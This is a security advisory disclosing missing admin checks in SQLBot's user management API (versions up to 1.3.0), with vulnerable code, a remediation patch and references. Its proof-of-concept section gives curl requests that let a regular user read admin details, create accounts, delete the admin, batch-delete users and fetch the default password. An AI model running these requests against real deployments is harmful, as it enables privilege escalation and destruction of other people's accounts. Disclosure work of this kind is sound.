# Broken Access Control in SQLBot User Management API Endpoints

## 1. Vulnerability Title
Broken Access Control in SQLBot User Management API Endpoints

## 2. Product Details
* **Vendor:** DataEase / FIT2CLOUD
* **Product:** SQLBot
* **Affected Version(s):** <= 1.3.0
* **Fixed Version:** N/A (unfixed at time of disclosure)

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285
* **Type Name:** Broken Function Level Authorization（BFLA）

## 4. Description
SQLBot version 1.3.0 and earlier contains a broken access control vulnerability in multiple user management API endpoints at `backend/apps/system/api/user.py`. Any authenticated user (regardless of role) can perform privileged operations including creating, modifying, deleting arbitrary users, and viewing sensitive user information.

The affected endpoints lack proper authorization checks (e.g., `isAdmin` verification), allowing horizontal and vertical privilege escalation. While endpoints like `PATCH /user/pwd/{id}` and `PATCH /user/status` properly check `current_user.isAdmin`, the following critical endpoints do not:

| Endpoint | Method | Line | Vulnerability |
|----------|--------|------|---------------|
| `/user/pager` | GET | 27 | View all users details |
| `/user/{id}` | GET | 123-130 | View any user's details including email, status, workspace assignments |
| `/user` | POST | 132-158 | Create new users with arbitrary privileges |
| `/user` | PUT | 160-193 | Modify any user's account, email, name, workspace assignments |
| `/user/{id}` | DELETE | 195-197 | Delete any user account |
| `/user` | DELETE | 199-202 | Batch delete multiple user accounts |
| `/user/defaultPwd` | GET | 23-25 | Retrieve system default password |

## 5. Impact
* **Impact Description:** Allows any authenticated low-privilege user to escalate privileges by creating admin accounts, modify or delete other users' accounts (including administrators), and access sensitive user information. This leads to complete compromise of the user management system.

## 6. Proof of Concept

### 6.1 View Any User's Details (IDOR)
```bash
# Authenticated as regular user, retrieve admin user (id=1) details
curl -X GET "http://<target>:8000/api/v1/user/1" \
  -H "X-Auth-Token: Bearer <regular_user_token>"
```

### 6.2 Create New User (Privilege Escalation)
```bash
curl -X POST "http://<target>:8000/api/v1/user" \
  -H "X-Auth-Token: Bearer <regular_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"account":"attacker","name":"Attacker","email":"attacker@evil.com","status":1,"oid":1,"oid_list":[1]}'
```

### 6.3 Delete Arbitrary User
```bash
# Delete admin user (id=1)
curl -X DELETE "http://<target>:8000/api/v1/user/1" \
  -H "X-Auth-Token: Bearer <regular_user_token>"
```

### 6.4 Batch Delete Users
```bash
curl -X DELETE "http://<target>:8000/api/v1/user" \
  -H "X-Auth-Token: Bearer <regular_user_token>" \
  -H "Content-Type: application/json" \
  -d '[2,3,4,5]'
```

### 6.5 Retrieve Default Password
```bash
curl -X GET "http://<target>:8000/api/v1/user/defaultPwd" \
  -H "X-Auth-Token: Bearer <regular_user_token>"
```

## 7. Vulnerable Code Reference
**File:** `backend/apps/system/api/user.py`

Comparison of vulnerable vs. secure endpoints:

**Secure (with authorization check):**
```python
# Line 217-223 - Properly checks admin role
@router.patch("/pwd/{id}")
async def pwdReset(session: SessionDep, current_user: CurrentUser, trans: Trans, id: int):
    if not current_user.isAdmin:  # Authorization check present
        raise Exception(trans('i18n_permission.no_permission', ...))
```

**Vulnerable (missing authorization check):**
```python
# Line 132-158 - No admin check
@router.post("")
async def create(session: SessionDep, creator: UserCreator, trans: Trans):
    # Missing: if not current_user.isAdmin: raise Exception(...)
    if check_account_exists(session=session, account=creator.account):
        ...

# Line 195-197 - No admin check
@router.delete("/{id}")
async def delete(session: SessionDep, id: int):
    # Missing authorization check entirely
    await single_delete(session, id)
```

## 8. Remediation
Add authorization checks to all privileged user management endpoints:

```python
@router.post("")
async def create(session: SessionDep, current_user: CurrentUser, creator: UserCreator, trans: Trans):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url="/user", msg=trans('i18n_permission.only_admin')))
    # ... existing logic

@router.delete("/{id}")
async def delete(session: SessionDep, current_user: CurrentUser, trans: Trans, id: int):
    if not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url="/user/{id}", msg=trans('i18n_permission.only_admin')))
    if id == 1:  # Prevent deletion of super admin
        raise Exception("Cannot delete super admin")
    await single_delete(session, id)
```

## 9. References
* **Vendor Repository:** https://github.com/dataease/SQLBot
* **CWE-285:** https://cwe.mitre.org/data/definitions/285.html
* **OWASP API1:2023 BFLA:** https://owasp.org/API-Security/editions/2023/en/0xa1-broken-function-level-authorization/